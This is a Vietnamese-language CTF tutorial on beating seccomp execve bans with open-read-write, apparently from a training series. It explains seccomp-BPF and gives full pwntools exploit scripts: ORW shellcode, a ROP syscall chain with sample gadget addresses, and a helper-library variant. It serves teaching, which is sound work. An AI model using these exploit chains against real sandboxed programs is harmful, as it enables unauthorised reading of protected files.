Seccomp & ORW

Đề cấm execve/execveat bằng seccomp (bộ lọc syscall trong kernel). Không mở được shell → phải đọc flag trực tiếp bằng chuỗi open → read → write (ORW). Bài này: đọc filter bằng seccomp-tools, dựng ORW shellcode/ROP số thật đọc /flag.

Bài này nói về cái gì?

Seccomp: kernel lọc syscall theo một chương trình BPF. Đề thường cấm execve(59)/execveat(322) → system("/bin/sh") bị giết (SIGSYS).

ORW: thay vì shell, dùng 3 syscall được phép: open("/flag",0) → read(fd,buf,0x40) → write(1,buf,0x40). Flag in ra màn hình.

Cách làm: đọc filter bằng seccomp-tools dump, xác nhận open/read/write cho phép, rồi dựng ORW bằng shellcode (nếu RWX) hoặc ROP/syscall (nếu NX).

Nếu chỉ nhớ một điều: Cấm execve? Đừng mở shell — open+read+write để tự đọc /flag.

⛓️ ORW ROP (NX)

Ghi "/flag\0" vào bss, rồi ROP: open(bss,0) → read(rax,bss2,0x40) → write(1,bss2,0x40). Dùng pop rdi/rsi/rdx/rax + syscall.

⚠️ Nhớ

openat(257) nếu open bị cấm. flag có thể "flag"/"/flag"/"flag.txt" — thử vài tên. fd open trả về → dùng cho read (thường = 3). Kiến trúc: x86 syscall number KHÁC.

01 / NỀN TẢNG BẮT BUỘC

Seccomp = bộ lọc syscall

seccomp (secure computing) là cơ chế kernel Linux cho phép một process tự khai báo: "từ giờ chỉ cho tôi gọi các syscall này". Chế độ mạnh là seccomp-BPF: nạp một chương trình BPF (Berkeley Packet Filter) chạy trên mỗi lần syscall, kiểm nr (số syscall) + arch rồi trả ALLOW / KILL (giết tiến trình bằng SIGSYS) / ERRNO / TRACE. Đề CTF dùng nó để cấm execve, buộc bạn không mở shell.

Định nghĩa nhanh

seccomp

Kernel lọc syscall của process.

BPF filter

Chương trình quyết ALLOW/KILL mỗi syscall.

SIGSYS

Tín hiệu giết khi gọi syscall cấm.

ORW

open+read+write — đọc file thủ công.

syscall nr

Số hiệu syscall (read=0...).

fd

File descriptor open trả về (≥3).

02 / VÌ SAO CÓ KỸ THUẬT

Shell bị cấm → đọc flag tay

Payload pwn "chuẩn" kết thúc bằng execve("/bin/sh") → shell → cat flag. Seccomp chặn đúng cái đó: dù bạn đã chiếm RIP hoàn toàn, gọi execve → SIGSYS, chết ngay. Nhưng flag chỉ là một file. Nếu open/read/write vẫn được phép (đề hiếm khi cấm hết — process còn phải chạy), bạn tự đọc file: mở /flag, đọc vào buffer, in ra stdout. Đó là ORW. Đây là kỹ năng bắt buộc ở Phase 5 vì gần như mọi đề pwn khó đều bật seccomp.

07 / EXPLOIT ĐẦY ĐỦ

ORW shellcode + ORW ROP (số thật)

# BẢN A — có vùng RWX / nhập shellcode chạy được. Seccomp cấm execve,
# nên shellcode làm ORW. Dùng shellcraft (pwntools tự ráp byte đúng).
from pwn import *
context.arch = "amd64"
exe = ELF("./chall", checksec=False); p = process(exe.path)

# cách 1: ghép tay open/read/write — rõ ràng
sc  = shellcraft.open("/flag", 0)          # rax=2, mở → fd ở rax
sc += shellcraft.read("rax", "rsp", 0x40)   # đọc fd (rax) vào [rsp]
sc += shellcraft.write(1, "rsp", 0x40)      # in [rsp] ra stdout
# cách 2 gọn: sc = shellcraft.cat("/flag")  # tự open+sendfile/read+write

payload = asm(sc)                            # dịch ra opcode thật
p.sendafter(b"input:", payload)            # chèn vào vùng RWX đã nhảy tới
print(p.recvall(timeout=2))                 # flag in ra
Thành thậtshellcraft.open/read/write sinh opcode đúng x86-64 (vd open = 48b82f666c6167...50 ... b802 0f05 push "/flag", rax=2, syscall). Tên /flag và vùng RWX là của đề mẫu; đổi path theo đề. shellcraft.cat("/flag") gọn nhất.
# BẢN B — NX bật, không chạy shellcode → ORW bằng ROP + syscall.
# Gadget số thật (binary mẫu, no-PIE):
#   pop rdi;ret = 0x401263 · pop rsi;ret = 0x40955e · pop rdx;ret = 0x4017cf
#   pop rax;ret = 0x44db34 · syscall    = 0x40137c
from pwn import *
exe = ELF("./chall", checksec=False); p = process(exe.path)
rdi=0x401263; rsi=0x40955e; rdx=0x4017cf; rax=0x44db34; sysc=0x40137c
BSS = 0x404500                                  # vùng bss ghi được, trống
OFF = 72

# 1) ghi "/flag\0" vào BSS bằng read(0, BSS, 8)
rop  = flat(rax,0, rdi,0, rsi,BSS, rdx,8, sysc)   # read(0,BSS,8)
# 2) open(BSS, 0) → fd (giả sử 3)
rop += flat(rax,2, rdi,BSS, rsi,0, rdx,0, sysc)
# 3) read(3, BSS+0x100, 0x40)
rop += flat(rax,0, rdi,3, rsi,BSS+0x100, rdx,0x40, sysc)
# 4) write(1, BSS+0x100, 0x40)
rop += flat(rax,1, rdi,1, rsi,BSS+0x100, rdx,0x40, sysc)

p.sendlineafter(b">", b"A"*OFF + rop)
p.send(b"/flag\x00\x00\x00")                      # cấp cho read bước 1
print(p.recvall(timeout=2))
Dùng ROP classThay vì flat tay: rop=ROP(exe); rop.read(0,BSS,8); rop.open(BSS,0); rop.read(3,BSS+0x100,0x40); rop.write(1,BSS+0x100,0x40) rồi rop.chain() — pwntools tự gom gadget. Nếu không có pop rdx, dùng ret2csu set rdx.
# BẢN C — pwnld.
from pwnld import *
context.arch="amd64"; exe=ELF("./chall",checksec=False); p=start()
sc = shellcraft.cat("/flag")          # open+read+write gọn
sa(b"input:", asm(sc)); print(p.recvall(timeout=2))
# bản ROP: orw_chain(exe, path="/flag", bss=0x404500)  # helper dựng 4 syscall
pwnldorw_chain dựng sẵn chuỗi open/read/write. Vẫn phải dump filter để chắc open/read/write sống.

09 / GỠ LỖI

Khi flag không ra

SIGSYS / Bad system call

Gọi syscall bị cấm. Dump lại, tránh syscall đó.

open trả -1

Sai tên/đường dẫn flag. Thử /flag, flag.txt.

read 0 byte

fd sai (không phải 3) hoặc rdx=0. Set rdx=0x40.

không in gì

write rdi≠1 hoặc buf sai. rdi=1 stdout.

open cấm

Dùng openat(257), AT_FDCWD=-100.

shellcode chết

NX bật → ROP thay. Hoặc rdx set sai len.
